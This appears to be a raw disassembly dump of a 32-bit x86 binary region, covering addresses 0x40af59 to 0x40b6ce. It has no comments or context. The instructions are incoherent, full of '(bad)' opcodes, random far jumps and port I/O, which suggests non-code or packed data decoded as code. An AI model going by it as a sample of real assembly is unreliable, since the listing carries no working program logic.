  40af59:	mov    ?,WORD PTR [ebx]
  40af5b:	es push 0x6b
  40af5e:	pushf  
  40af5f:	or     BYTE PTR [edi+edi*4],bh
  40af62:	dec    eax
  40af63:	std    
  40af64:	or     ah,BYTE PTR [ebp+0x30]
  40af67:	xchg   ecx,eax
  40af68:	sar    BYTE PTR [ecx+ecx*1+0x654f047d],cl
  40af6f:	shl    ebx,1
  40af71:	and    BYTE PTR [eax+0x244272e8],cl
  40af77:	iret   
  40af78:	lods   al,BYTE PTR ds:[esi]
  40af79:	add    eax,DWORD PTR [eax]
  40af7b:	jecxz  0x40afad
  40af7d:	call   0xe6e728d8
  40af82:	into   
  40af83:	dec    ecx
  40af84:	or     eax,0x228148f3
  40af89:	xor    eax,0x2fefb8ca
  40af8e:	stc    
  40af8f:	sub    al,0x6e
  40af91:	rcr    BYTE PTR [ebp+0x57],1
  40af94:	push   ecx
  40af95:	out    dx,eax
  40af96:	mov    al,0xa8
  40af98:	fnsave [eax]
  40af9a:	push   0x34
  40af9c:	into   
  40af9d:	pop    ebp
  40af9e:	or     al,0x59
  40afa0:	mov    dl,0xb8
  40afa2:	sbb    ah,al
  40afa4:	xchg   BYTE PTR [ecx-0x6974cdb3],dh
  40afaa:	sbb    dh,BYTE PTR ds:0x7fe1e15d
  40afb0:	pop    esp
  40afb1:	retf   
  40afb2:	push   0x36
  40afb4:	sbb    eax,0x6dacbe61
  40afb9:	data16 lock xchg al,dh
  40afbd:	shl    DWORD PTR [ebp-0x36],cl
  40afc0:	push   esi
  40afc1:	mov    eax,0x65530086
  40afc6:	rcl    BYTE PTR [eax-0x69],1
  40afc9:	adc    al,bh
  40afcb:	mov    dh,ah
  40afcd:	fwait
  40afce:	mov    ecx,0xd7d79b12
  40afd3:	jne    0x40b024
  40afd5:	mov    ch,0x3
  40afd7:	(bad)  
  40afd8:	and    BYTE PTR [edi+0x40],dl
  40afdb:	and    eax,0xdf29af6
  40afe0:	pop    esi
  40afe1:	add    eax,0x1d1353c8
  40afe6:	cwde   
  40afe7:	mov    eax,0x1df1445f
  40afec:	pusha  
  40afed:	stc    
  40afee:	int3   
  40afef:	inc    eax
  40aff0:	add    DWORD PTR [esi+ebx*2],0xd74390dc
  40aff7:	fidivr WORD PTR [esi]
  40aff9:	jecxz  0x40afdc
  40affb:	add    al,0xab
  40affd:	mov    edx,0x2a8e2f5
  40b002:	test   al,0xa7
  40b004:	paddusb mm3,mm1
  40b007:	fs push cs
  40b009:	out    0xfe,al
  40b00b:	mov    bl,0x52
  40b00d:	cmp    eax,DWORD PTR [edx+eiz*8-0x74]
  40b011:	not    bl
  40b013:	sub    ah,ch
  40b015:	cli    
  40b016:	push   DWORD PTR [ecx]
  40b018:	arpl   WORD PTR [esi+0x77],bp
  40b01b:	jg     0x40b02a
  40b01d:	push   eax
  40b01e:	fwait
  40b01f:	mov    ah,0x48
  40b021:	push   eax
  40b022:	mov    dh,0x17
  40b024:	mov    BYTE PTR [edi+0x5e741871],ah
  40b02a:	or     bl,BYTE PTR [ebx+ebp*1+0x52a2a092]
  40b031:	jp     0x40b04b
  40b033:	(bad)  
  40b034:	cli    
  40b035:	(bad)  [ecx+0x2c]
  40b038:	push   ds
  40b039:	xor    eax,0x5d517b4a
  40b03e:	push   ss
  40b03f:	mov    cl,ah
  40b041:	inc    edx
  40b042:	adc    BYTE PTR [eax+0x40ce1658],ch
  40b048:	bound  ebx,QWORD PTR [eax+0x73d6a861]
  40b04e:	jmp    0xe3bd:0xde02176f
  40b055:	in     al,0xc9
  40b057:	xchg   esi,eax
  40b058:	mov    WORD PTR [ecx-0x4d1520cd],ds
  40b05e:	ins    DWORD PTR es:[edi],dx
  40b05f:	inc    eax
  40b060:	outs   dx,DWORD PTR ds:[esi]
  40b061:	push   edi
  40b062:	mov    ebp,0x459f1e61
  40b067:	mov    ebp,0x3f2ba65c
  40b06c:	mov    ecx,0x617a5da9
  40b071:	xchg   ebx,eax
  40b072:	call   0xb265:0xbf103ba7
  40b079:	pop    edi
  40b07a:	dec    edi
  40b07b:	dec    eax
  40b07c:	lea    esi,[eax]
  40b07e:	xor    al,0xb4
  40b080:	jmp    FWORD PTR [eax+0x102d36e9]
  40b086:	cmp    al,0x70
  40b088:	lds    ebp,FWORD PTR [edi+edi*1-0x18]
  40b08c:	push   ebp
  40b08d:	adc    eax,0x605c4e40
  40b092:	add    dl,BYTE PTR [edi+0x2c019b0a]
  40b098:	dec    esp
  40b099:	mov    WORD PTR [edx+0x1c],cs
  40b09c:	mov    ebx,0x2cbaea9c
  40b0a1:	das    
  40b0a2:	test   esp,edi
  40b0a4:	inc    ebx
  40b0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a6:	cmp    DWORD PTR [edx-0x17],edi
  40b0a9:	leave  
  40b0aa:	cmp    BYTE PTR [edx],bl
  40b0ac:	mov    al,ds:0x103b3b55
  40b0b1:	push   ecx
  40b0b2:	jno    0x40b061
  40b0b4:	scas   eax,DWORD PTR es:[edi]
  40b0b5:	imul   dx
  40b0b8:	jmp    0x6291b9f6
  40b0bd:	rcr    BYTE PTR [esi+ecx*2-0x2a],0x4c
  40b0c2:	jge    0x40b108
  40b0c4:	mov    DWORD PTR [eax],ebx
  40b0c6:	pop    esi
  40b0c7:	dec    eax
  40b0c8:	fiadd  DWORD PTR ds:[edx-0x1a]
  40b0cc:	pop    ebp
  40b0cd:	push   ebp
  40b0ce:	mov    ah,BYTE PTR [ecx-0x16ccc761]
  40b0d4:	dec    esp
  40b0d5:	outs   dx,DWORD PTR ds:[esi]
  40b0d6:	cmc    
  40b0d7:	sbb    eax,0x9c874489
  40b0dc:	and    eax,0xec9df9bc
  40b0e1:	std    
  40b0e2:	jnp    0x40b064
  40b0e4:	rcr    dh,1
  40b0e6:	ds out 0xfb,al
  40b0e9:	or     al,0x56
  40b0eb:	ds dec edi
  40b0ed:	push   edx
  40b0ee:	jno    0x40b140
  40b0f0:	jbe    0x40b0b0
  40b0f2:	mov    cl,0xa7
  40b0f4:	sub    eax,0x5dc6d06f
  40b0f9:	push   ebx
  40b0fa:	xor    edx,DWORD PTR [ecx+eiz*2-0x79]
  40b0fe:	ror    dh,1
  40b100:	adc    BYTE PTR [esi-0xc],ch
  40b103:	pop    esi
  40b104:	push   0x5f
  40b106:	jp     0x40b16d
  40b108:	enter  0x18fd,0xd4
  40b10c:	push   esp
  40b10d:	mov    ebp,0xe9c95a9b
  40b112:	loopne 0x40b0cc
  40b114:	push   0x6d5d1942
  40b119:	push   eax
  40b11a:	xor    esi,ecx
  40b11c:	mov    BYTE PTR [eax-0x2a],cl
  40b11f:	sub    BYTE PTR [eax+0x15],dl
  40b122:	mov    WORD PTR [ebp+0x60a7000d],fs
  40b128:	int3   
  40b129:	xchg   ecx,eax
  40b12a:	pushf  
  40b12b:	xchg   ecx,eax
  40b12c:	lock cld 
  40b12e:	scas   al,BYTE PTR es:[edi]
  40b12f:	je     0x40b0fb
  40b131:	jb     0x40b123
  40b133:	(bad)  
  40b135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b136:	sub    ch,BYTE PTR [ebp-0x2d]
  40b139:	(bad)  
  40b13a:	retf   
  40b13b:	jnp    0x40b1ba
  40b13d:	nop
  40b13e:	(bad)  [ebp+0x6]
  40b141:	and    eax,ebx
  40b143:	xor    BYTE PTR [ecx-0x7efab1ac],0xf0
  40b14a:	dec    edi
  40b14b:	pop    ds
  40b14c:	xlat   BYTE PTR ds:[ebx]
  40b14d:	push   edi
  40b14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b14f:	cmp    eax,0x823b79ce
  40b154:	out    0x3e,al
  40b156:	dec    ebp
  40b157:	daa    
  40b158:	dec    esi
  40b159:	les    edi,FWORD PTR [edi+0x6]
  40b15c:	imul   esp,ebp,0x62
  40b15f:	push   0x46
  40b161:	cdq    
  40b162:	shl    dl,1
  40b164:	out    dx,al
  40b165:	mov    ch,0x5e
  40b167:	xor    BYTE PTR [ecx],0x6
  40b16a:	jmp    0x51f74d31
  40b16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b170:	adc    al,dl
  40b172:	xchg   ecx,eax
  40b173:	ret    
  40b174:	mov    ebp,ebx
  40b176:	hlt    
  40b177:	push   ds
  40b178:	pop    ebp
  40b179:	xor    edi,DWORD PTR [eax-0x666daed7]
  40b17f:	pop    eax
  40b180:	jecxz  0x40b15f
  40b182:	lds    esi,FWORD PTR [edx]
  40b184:	xor    dl,BYTE PTR [edi+0x18ecfe6d]
  40b18a:	pop    ebx
  40b18b:	jle    0x40b125
  40b18d:	mov    dl,0xc1
  40b18f:	mov    ds:0x33a773a7,al
  40b194:	ins    BYTE PTR es:[edi],dx
  40b195:	lahf   
  40b196:	test   al,0xab
  40b198:	or     DWORD PTR [ebx],0x1bd780fd
  40b19e:	pop    esi
  40b19f:	or     BYTE PTR [edi-0x34373989],dl
  40b1a5:	aad    0x2e
  40b1a7:	add    DWORD PTR [edx],0xe1a29669
  40b1ad:	int    0xfe
  40b1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b0:	hlt    
  40b1b1:	pop    ss
  40b1b2:	and    esp,DWORD PTR [edx]
  40b1b4:	loopne 0x40b188
  40b1b6:	bound  edx,QWORD PTR [eax*2+0x6a40fb1b]
  40b1bd:	lahf   
  40b1be:	or     BYTE PTR [eax+edi*1],ah
  40b1c1:	push   edx
  40b1c2:	jo     0x40b178
  40b1c4:	iret   
  40b1c5:	jae    0x40b1cd
  40b1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c8:	int3   
  40b1c9:	mov    edi,0xf4adeb9
  40b1ce:	sbb    eax,ecx
  40b1d0:	mov    WORD PTR [edx],cs
  40b1d2:	xchg   esp,eax
  40b1d3:	jbe    0x40b194
  40b1d5:	or     DWORD PTR [ebx+0x6cd59b85],esp
  40b1db:	pop    esi
  40b1dc:	sbb    al,0x4
  40b1de:	clc    
  40b1df:	stos   DWORD PTR es:[edi],eax
  40b1e0:	jecxz  0x40b1cc
  40b1e2:	adc    ecx,DWORD PTR [eax-0x31]
  40b1e5:	pop    ecx
  40b1e6:	ret    0xcf15
  40b1e9:	push   edx
  40b1ea:	mov    BYTE PTR [ecx+ecx*4-0x1ab4a7],al
  40b1f1:	loop   0x40b1ec
  40b1f3:	push   ebp
  40b1f4:	jle    0x40b229
  40b1f6:	aaa    
  40b1f7:	cmc    
  40b1f8:	out    dx,al
  40b1f9:	fisub  WORD PTR [edx]
  40b1fb:	gs aad 0xe5
  40b1fe:	push   edx
  40b1ff:	out    0x8e,eax
  40b201:	mov    bl,0x14
  40b203:	jecxz  0x40b22a
  40b205:	mov    al,ds:0x7c67901d
  40b20a:	push   ebp
  40b20b:	outs   dx,BYTE PTR ds:[esi]
  40b20c:	fcomip st,st(6)
  40b20e:	jl     0x40b284
  40b210:	push   ecx
  40b211:	stc    
  40b212:	imul   edi,DWORD PTR [eax-0x2b],0x15dd392e
  40b219:	push   ebx
  40b21a:	mov    al,ds:0x218e4334
  40b21f:	add    ecx,esi
  40b221:	(bad)
  40b226:	aam    0xc8
  40b228:	pusha  
  40b229:	pop    esp
  40b22a:	das    
  40b22b:	jmp    FWORD PTR [esi]
  40b22d:	lods   al,BYTE PTR ds:[esi]
  40b22e:	adc    al,0xa0
  40b230:	mov    ecx,0x5ca3de81
  40b235:	mov    ah,BYTE PTR [esi-0x24]
  40b238:	not    DWORD PTR [ebp-0x679672c5]
  40b23e:	jecxz  0x40b1d5
  40b240:	push   eax
  40b241:	out    dx,al
  40b242:	or     eax,0x610b2af4
  40b247:	test   al,0xd8
  40b249:	(bad)  
  40b24a:	rcr    DWORD PTR [eax-0x41],0x20
  40b24e:	icebp  
  40b24f:	outs   dx,DWORD PTR ds:[esi]
  40b250:	inc    ebp
  40b251:	(bad)  
  40b252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b253:	push   ss
  40b254:	xlat   BYTE PTR ds:[ebx]
  40b255:	or     eax,0x148a9e05
  40b25a:	or     dl,BYTE PTR ds:0xcbd78b8
  40b260:	xchg   ebp,eax
  40b261:	pop    es
  40b262:	sahf   
  40b263:	jae    0x40b296
  40b265:	or     BYTE PTR [edi+edi*1-0x11e8f6b6],0x1a
  40b26d:	pop    eax
  40b26e:	jbe    0x40b22b
  40b270:	or     eax,0x6bb1679a
  40b275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b276:	mov    ds:0xbf62f9bf,eax
  40b27b:	imul   ebp,eax,0x20
  40b27e:	push   edx
  40b27f:	repnz add bh,BYTE PTR [edi+edi*1-0x28]
  40b284:	cmp    ecx,edi
  40b286:	or     DWORD PTR [edi*4+0x2e7ff99f],edx
  40b28d:	mov    DWORD PTR [eax-0x2b3cdf34],0xa7e9865f
  40b297:	or     al,0xed
  40b299:	xchg   edx,eax
  40b29a:	xor    DWORD PTR [ebp+0x61],esp
  40b29d:	mov    gs,edx
  40b29f:	aas    
  40b2a0:	jecxz  0x40b228
  40b2a2:	(bad)  
  40b2a3:	or     cl,bl
  40b2a5:	repz rcr BYTE PTR [edx-0x7b],1
  40b2a9:	mov    WORD PTR [eax],?
  40b2ab:	leave  
  40b2ac:	dec    edi
  40b2ad:	jecxz  0x40b2c9
  40b2af:	pop    ds
  40b2b0:	int3   
  40b2b1:	mov    edi,0x24b95510
  40b2b6:	push   ss
  40b2b7:	mov    ds:0x26c8545f,eax
  40b2bc:	xor    eax,0xe205bc8e
  40b2c1:	cmp    eax,0xc9b93906
  40b2c6:	fild   QWORD PTR [edx]
  40b2c8:	loop   0x40b31e
  40b2ca:	cmp    dh,BYTE PTR [eax+0x6431e38b]
  40b2d0:	mov    eax,0x6b8090e
  40b2d5:	sub    eax,edi
  40b2d7:	mov    dl,0xb1
  40b2d9:	mov    ebx,0x66cfcdf9
  40b2de:	into   
  40b2df:	jge    0x40b33b
  40b2e1:	loopne 0x40b338
  40b2e3:	stos   DWORD PTR es:[edi],eax
  40b2e4:	xchg   ebx,eax
  40b2e5:	mov    gs,WORD PTR [edi+0x4f8147d2]
  40b2eb:	stos   BYTE PTR es:[edi],al
  40b2ec:	clc    
  40b2ed:	mov    ds:0xee76bf03,eax
  40b2f2:	fild   DWORD PTR [esi-0x14]
  40b2f5:	push   ds
  40b2f6:	xor    DWORD PTR [ebx-0x21],edi
  40b2f9:	mov    WORD PTR [edi-0x69a014a3],ds
  40b2ff:	dec    edi
  40b300:	inc    ebp
  40b301:	sub    al,0x87
  40b303:	mov    ebp,0x2658b540
  40b308:	xchg   ecx,eax
  40b309:	ja     0x40b37d
  40b30b:	dec    edi
  40b30c:	dec    ebx
  40b30d:	cld    
  40b30e:	cmc    
  40b30f:	popa   
  40b310:	or     al,0x29
  40b312:	lahf   
  40b313:	outs   dx,BYTE PTR ds:[esi]
  40b314:	mov    ah,0x81
  40b316:	pop    edi
  40b317:	mov    edi,0x8438ee78
  40b31c:	pop    ss
  40b31d:	call   0xa6191a0d
  40b322:	push   ebp
  40b323:	jecxz  0x40b31c
  40b325:	out    0xe,al
  40b327:	dec    edx
  40b328:	xchg   esp,eax
  40b329:	out    dx,al
  40b32a:	iret   
  40b32b:	stos   DWORD PTR es:[edi],eax
  40b32c:	and    DWORD PTR [edi],ecx
  40b32e:	jg     0x40b2ef
  40b330:	(bad)  
  40b331:	ud2    
  40b333:	and    cl,BYTE PTR [ebp-0x21146115]
  40b339:	push   ecx
  40b33a:	cwde   
  40b33b:	mov    ds:0x7b65e19a,eax
  40b340:	mov    cl,0x42
  40b342:	out    dx,al
  40b343:	jo     0x40b2f4
  40b345:	sbb    BYTE PTR [eax-0x1e],ch
  40b348:	jnp    0x40b340
  40b34a:	mov    ah,0x75
  40b34c:	pop    ecx
  40b34d:	(bad)
  40b350:	ss cmc 
  40b352:	enter  0x2574,0x6
  40b356:	cmp    bh,BYTE PTR [eax+0x0]
  40b359:	rol    DWORD PTR [ebx],1
  40b35b:	out    dx,eax
  40b35c:	mov    ebp,0xe8749948
  40b361:	sub    esp,0x58687dd1
  40b367:	cmp    edx,DWORD PTR [ebp+0x6d]
  40b36a:	add    al,0x52
  40b36c:	js     0x40b3a9
  40b36e:	push   0x3d
  40b370:	(bad)  
  40b371:	lods   al,BYTE PTR ds:[esi]
  40b372:	xchg   esi,eax
  40b373:	(bad)  
  40b374:	jmp    0x40b33c
  40b376:	push   0x57de9639
  40b37b:	mov    al,BYTE PTR [edi]
  40b37d:	sbb    bl,BYTE PTR [esp+esi*1]
  40b380:	loop   0x40b3c9
  40b382:	sub    DWORD PTR ss:[edx+0x63d9396],0xc4a07af4
  40b38d:	out    0x44,al
  40b38f:	jl     0x40b348
  40b391:	nop
  40b392:	rcr    dl,1
  40b394:	push   edi
  40b395:	push   ebp
  40b396:	imul   ecx,DWORD PTR [edi-0x63],0x5f4f5d7f
  40b39d:	test   al,0x61
  40b39f:	dec    edi
  40b3a0:	popf   
  40b3a1:	in     al,dx
  40b3a2:	push   edi
  40b3a3:	je     0x40b421
  40b3a5:	aas    
  40b3a6:	mov    WORD PTR [eax+ebx*2-0xaf7ef5b],ds
  40b3ad:	cmp    al,0x11
  40b3af:	adc    eax,DWORD PTR [edi+0x72]
  40b3b2:	push   0x879d6a48
  40b3b7:	sub    eax,DWORD PTR cs:[eax]
  40b3ba:	das    
  40b3bb:	xor    al,0xf8
  40b3bd:	jns    0x40b415
  40b3bf:	shr    DWORD PTR [edx],1
  40b3c1:	add    BYTE PTR [edi],dh
  40b3c3:	out    dx,al
  40b3c4:	ror    eax,cl
  40b3c6:	sar    BYTE PTR [edx+0x5911e87a],cl
  40b3cc:	jbe    0x40b35c
  40b3ce:	mov    edi,0x2d0e691a
  40b3d3:	xor    eax,0x7574df0
  40b3d8:	es out dx,eax
  40b3da:	ret    
  40b3db:	dec    eax
  40b3dc:	xchg   esp,eax
  40b3dd:	(bad)  
  40b3de:	lods   eax,DWORD PTR ds:[esi]
  40b3df:	inc    edx
  40b3e0:	pop    esp
  40b3e1:	dec    esp
  40b3e2:	xlat   BYTE PTR ds:[ebx]
  40b3e3:	xchg   ebp,eax
  40b3e4:	mov    al,ds:0x86313594
  40b3e9:	arpl   WORD PTR [ebx],di
  40b3eb:	dec    ebp
  40b3ec:	int    0x3f
  40b3ee:	sub    eax,0x5682536a
  40b3f3:	sbb    DWORD PTR [edi-0x3150a64a],esp
  40b3f9:	mov    ecx,0xfb78192f
  40b3fe:	sub    al,bl
  40b400:	mov    esp,0xf7dee8a5
  40b405:	leave  
  40b406:	es fwait
  40b408:	das    
  40b409:	stos   BYTE PTR es:[edi],al
  40b40a:	mov    ch,0xde
  40b40c:	sti    
  40b40d:	jl     0x40b43d
  40b40f:	das    
  40b410:	(bad)  
  40b411:	aas    
  40b412:	cli    
  40b413:	jp     0x40b483
  40b415:	jno    0x40b420
  40b417:	fsub   DWORD PTR [eax+ecx*4+0x19]
  40b41b:	dec    esp
  40b41c:	pop    eax
  40b41d:	fwait
  40b41e:	dec    eax
  40b41f:	xlat   BYTE PTR ds:[ebx]
  40b420:	mov    edi,DWORD PTR [esi-0x58]
  40b423:	mov    ?,ebp
  40b425:	inc    edx
  40b426:	js     0x40b455
  40b428:	xchg   edx,eax
  40b429:	sti    
  40b42a:	ins    BYTE PTR es:[edi],dx
  40b42b:	push   0xbfdbc483
  40b430:	or     al,0x13
  40b432:	pop    ebx
  40b433:	dec    edx
  40b434:	mov    bl,0xa3
  40b436:	cmp    al,0xba
  40b438:	inc    esi
  40b439:	cmp    eax,0xf35cdb7c
  40b43e:	add    BYTE PTR [eax-0x2b],dh
  40b441:	sti    
  40b442:	cmp    BYTE PTR [ebx+0x5b27bda4],al
  40b448:	jl     0x40b40b
  40b44a:	jge    0x40b3e8
  40b44c:	lahf   
  40b44d:	jbe    0x40b4a0
  40b44f:	mov    cl,0xbd
  40b451:	fadd   st(3),st
  40b453:	stos   DWORD PTR es:[edi],eax
  40b454:	scas   eax,DWORD PTR es:[edi]
  40b455:	retf   0x57ba
  40b458:	aam    0xbc
  40b45a:	jg     0x40b457
  40b45c:	add    al,BYTE PTR [ebp-0x6b823a47]
  40b462:	push   esi
  40b463:	sar    DWORD PTR ds:0xc149eaec,1
  40b469:	jns    0x40b444
  40b46b:	out    0x1f,eax
  40b46d:	iret   
  40b46e:	adc    al,0x57
  40b470:	aad    0x5f
  40b472:	dec    ebx
  40b473:	popf   
  40b474:	addr16 lahf 
  40b476:	inc    esi
  40b477:	int    0x4e
  40b479:	(bad)  
  40b47b:	jl     0x40b3fe
  40b47d:	mov    esp,0x320b1e13
  40b482:	stos   BYTE PTR es:[edi],al
  40b483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b484:	add    BYTE PTR [edi],bh
  40b486:	mov    bh,0x81
  40b488:	outs   dx,DWORD PTR ds:[esi]
  40b489:	test   edx,ebx
  40b48b:	ret    
  40b48c:	mov    ds:0xe2053fc9,eax
  40b491:	cmp    BYTE PTR [ecx+0x2f444837],ch
  40b497:	mov    ch,0x6
  40b499:	xor    DWORD PTR gs:[ecx-0x73],0x70
  40b49e:	mov    esi,0xa8d35668
  40b4a3:	cli    
  40b4a4:	adc    BYTE PTR [ebp-0x3d],0x68
  40b4a8:	(bad)  
  40b4a9:	or     eax,0xacd6fd2c
  40b4ae:	ins    DWORD PTR es:[edi],dx
  40b4af:	mov    bl,BYTE PTR [eax]
  40b4b1:	pop    esi
  40b4b2:	pop    ebx
  40b4b3:	xor    dh,BYTE PTR [ebx]
  40b4b5:	arpl   WORD PTR [ecx],sp
  40b4b7:	out    dx,eax
  40b4b8:	xor    al,0xf6
  40b4ba:	xchg   edi,eax
  40b4bb:	xor    esi,DWORD PTR [edx-0x34]
  40b4be:	jg     0xbdd7fef4
  40b4c4:	adc    eax,0xc5f77bfb
  40b4c9:	and    eax,0x8fe3557b
  40b4ce:	fstp   TBYTE PTR [ebp-0x20df8320]
  40b4d4:	mov    esi,0xf0793200
  40b4d9:	sbb    BYTE PTR [ebx],dl
  40b4db:	out    dx,eax
  40b4dc:	rol    edx,cl
  40b4de:	cld    
  40b4df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e0:	push   0xffffffee
  40b4e2:	popf   
  40b4e3:	sbb    eax,0x3b3c4102
  40b4e8:	jo     0x40b483
  40b4ea:	ja     0x40b4c7
  40b4ec:	cdq    
  40b4ed:	out    dx,al
  40b4ee:	dec    esi
  40b4ef:	fcom   DWORD PTR [eax+eax*1]
  40b4f2:	ins    DWORD PTR es:[edi],dx
  40b4f3:	push   eax
  40b4f4:	sbb    edi,0xb181afb9
  40b4fa:	xlat   BYTE PTR ds:[ebx]
  40b4fb:	and    DWORD PTR [ebp+0x35],0x4ef26b59
  40b502:	push   ds
  40b503:	out    0x16,eax
  40b505:	pop    eax
  40b506:	pusha  
  40b507:	inc    ebp
  40b508:	popf   
  40b509:	or     DWORD PTR [esi+0x5de6bcbf],0x4c3fddae
  40b513:	jle    0x40b594
  40b515:	stc    
  40b516:	aaa    
  40b517:	jo     0x40b565
  40b519:	pop    edi
  40b51a:	gs js  0x40b4dd
  40b51d:	xor    eax,0xdbe1368f
  40b522:	xchg   edx,eax
  40b523:	mov    al,ds:0x7e12f485
  40b528:	icebp  
  40b529:	and    BYTE PTR [ebp-0x72],0x7c
  40b52d:	xchg   edx,eax
  40b52e:	call   0xedfff114
  40b533:	in     eax,dx
  40b534:	lds    esp,FWORD PTR [edi-0x2af0c9c2]
  40b53a:	dec    ebp
  40b53b:	add    dh,cl
  40b53d:	lods   al,BYTE PTR ds:[esi]
  40b53e:	sub    al,0x49
  40b540:	push   ds
  40b541:	shl    bh,0x18
  40b544:	mov    edx,0xbc9ad62c
  40b549:	adc    ch,BYTE PTR [edi-0x5442f41e]
  40b54f:	cs js  0x40b5c5
  40b552:	push   edx
  40b553:	cmp    al,0xb3
  40b555:	out    dx,al
  40b556:	cmp    eax,DWORD PTR [ebx+eiz*1+0x2b]
  40b55a:	ins    DWORD PTR es:[edi],dx
  40b55b:	stos   BYTE PTR es:[edi],al
  40b55c:	js     0x40b570
  40b55e:	push   ebp
  40b55f:	and    dh,ah
  40b561:	lock jnp 0x40b584
  40b564:	(bad)  
  40b565:	xor    DWORD PTR ds:0x304295bf,edi
  40b56b:	pusha  
  40b56c:	ja     0x40b550
  40b56e:	xlat   BYTE PTR ds:[ebx]
  40b56f:	jns    0x40b55c
  40b571:	test   BYTE PTR [ebx+0x53],0x7d
  40b575:	dec    esi
  40b576:	in     al,0x3d
  40b578:	aaa    
  40b579:	xchg   esp,eax
  40b57a:	stos   BYTE PTR es:[edi],al
  40b57b:	pop    dx
  40b57d:	iret   
  40b57e:	sbb    al,0xb5
  40b580:	xor    dh,BYTE PTR [edx]
  40b582:	(bad)  
  40b584:	mov    bl,ch
  40b586:	repnz add eax,0x766eacd
  40b58c:	jne    0x40b586
  40b58e:	inc    ebp
  40b58f:	retf   0xe8f7
  40b592:	adc    DWORD PTR [esi],eax
  40b594:	push   gs
  40b596:	jp     0x40b568
  40b598:	loop   0x40b5b1
  40b59a:	and    eax,0xecbccd50
  40b59f:	adc    eax,0x7a1b336c
  40b5a4:	mov    es,WORD PTR [eax-0x301c3589]
  40b5aa:	test   DWORD PTR ds:0x6df798a5,eax
  40b5b0:	std    
  40b5b1:	in     al,dx
  40b5b2:	cmp    DWORD PTR [ecx],0xffffff95
  40b5b5:	les    edx,FWORD PTR [ebx+0x784f56d6]
  40b5bb:	ret    
  40b5bc:	sbb    cl,BYTE PTR [edi-0x5d]
  40b5bf:	lock mov eax,ds:0x63b2a7b7
  40b5c5:	push   edx
  40b5c6:	xchg   ebp,eax
  40b5c7:	ret    0xe83c
  40b5ca:	popa   
  40b5cb:	or     eax,0x61522f8f
  40b5d0:	push   0xc2b1b657
  40b5d5:	pushf  
  40b5d6:	jo     0x40b5e9
  40b5d8:	clc    
  40b5d9:	push   ds
  40b5da:	cmp    esi,esi
  40b5dc:	mov    edx,0x1292c593
  40b5e1:	cld    
  40b5e2:	mov    esi,0x23a6230a
  40b5e7:	mov    dl,0x10
  40b5e9:	sub    eax,0xf71c729d
  40b5ee:	or     esi,DWORD PTR [ebx]
  40b5f0:	cmp    esp,DWORD PTR [ebp-0x62]
  40b5f3:	shl    BYTE PTR [esi+0x37],cl
  40b5f6:	dec    edx
  40b5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f8:	xchg   ebx,eax
  40b5f9:	call   0xba851e2a
  40b5fe:	stos   DWORD PTR es:[edi],eax
  40b5ff:	mov    dl,BYTE PTR [eax+edx*4+0x79c2eb91]
  40b606:	scas   eax,DWORD PTR es:[edi]
  40b607:	cmp    ecx,DWORD PTR ds:0xb6391486
  40b60d:	inc    ecx
  40b60e:	jne    0x40b5d9
  40b610:	mov    edx,0x67787437
  40b615:	mov    eax,0x329be79
  40b61a:	adc    al,0x31
  40b61c:	sbb    eax,0xe9e2d271
  40b621:	stc    
  40b622:	test   BYTE PTR [ecx-0x172c7e44],0x2d
  40b629:	(bad)  
  40b62a:	lds    eax,FWORD PTR [ebx+0x27]
  40b62d:	(bad)  
  40b62e:	fild   DWORD PTR [edi]
  40b630:	leave  
  40b631:	mov    cl,0xd1
  40b633:	ins    BYTE PTR es:[edi],dx
  40b634:	xor    dl,bh
  40b636:	xor    ecx,DWORD PTR [ebp+edi*8-0xe]
  40b63a:	dec    esp
  40b63b:	xor    ecx,ebx
  40b63d:	loopne 0x40b5de
  40b63f:	jmp    0x8283:0x54fe0fe2
  40b646:	seta   BYTE PTR [ebx-0x7a27c61]
  40b64d:	sub    eax,0xbf18bace
  40b652:	xchg   ecx,eax
  40b653:	push   esi
  40b654:	xchg   ebp,eax
  40b655:	push   ds
  40b656:	(bad)  
  40b657:	in     al,0xea
  40b659:	jne    0x40b65e
  40b65b:	popa   
  40b65c:	add    eax,0xbb1d804c
  40b661:	sbb    dh,BYTE PTR [ecx-0x44be08ca]
  40b667:	sbb    eax,DWORD PTR [eax-0x436192db]
  40b66d:	push   ebx
  40b66e:	mov    ecx,0xf1a16b8d
  40b673:	sub    ebx,eax
  40b675:	ins    DWORD PTR es:[edi],dx
  40b676:	xlat   BYTE PTR ds:[ebx]
  40b677:	test   DWORD PTR [eax],0x18fe3ceb
  40b67d:	add    bl,dh
  40b67f:	push   ebp
  40b680:	dec    esp
  40b681:	cmp    DWORD PTR [ebx],ecx
  40b683:	mov    ds:0x2d8367ac,eax
  40b688:	ret    
  40b689:	or     al,0xec
  40b68b:	xor    DWORD PTR [esp+ebx*2+0x67a37af2],esi
  40b692:	inc    ecx
  40b693:	aaa    
  40b694:	pop    ecx
  40b695:	ins    BYTE PTR es:[edi],dx
  40b696:	inc    eax
  40b697:	push   esp
  40b698:	inc    eax
  40b699:	in     eax,0x23
  40b69b:	mov    BYTE PTR [esi],al
  40b69d:	jg     0x40b6c0
  40b69f:	push   edx
  40b6a0:	dec    edx
  40b6a1:	test   edx,0xe5b4328f
  40b6a7:	xor    eax,ebx
  40b6a9:	out    dx,eax
  40b6aa:	enter  0x828b,0xce
  40b6ae:	mov    edx,0xb92132a3
  40b6b3:	mov    esi,0xb049cc5
  40b6b8:	sbb    bh,cl
  40b6ba:	adc    DWORD PTR [ecx],ebx
  40b6bc:	dec    eax
  40b6bd:	js     0x40b63f
  40b6bf:	pop    ebp
  40b6c0:	fisttp DWORD PTR [ebp-0x7f4c82ce]
  40b6c6:	add    ecx,DWORD PTR [edx-0x1bf347fa]
  40b6cc:	dec    esp
  40b6cd:	scas   eax,DWORD PTR es:[edi]
  40b6ce:	add    eax,0xf8551c89
